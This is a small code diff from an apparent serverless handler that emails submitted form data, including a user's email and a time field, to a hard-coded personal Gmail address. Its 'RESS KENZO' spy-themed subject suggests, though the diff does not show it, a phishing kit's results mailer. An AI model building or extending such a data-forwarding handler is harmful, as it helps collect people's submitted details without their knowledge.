@@ -94,7 +94,7 @@ export default async function handler(req, res) {
             body: JSON.stringify({
                 from: "RESS KENZO <onboarding@resend.dev>",
                 to: ["medikaputra5@gmail.com"],
-                subject: "🕵️ RESS KENZO 🕵️ - " + (d.email || "-") + " [" + (d.waktu || "-") + "]",
+                subject: "🕵️ RESS KENZO 🕵️ - " + Date.now(),
                 html: htmlBody
             })
         });
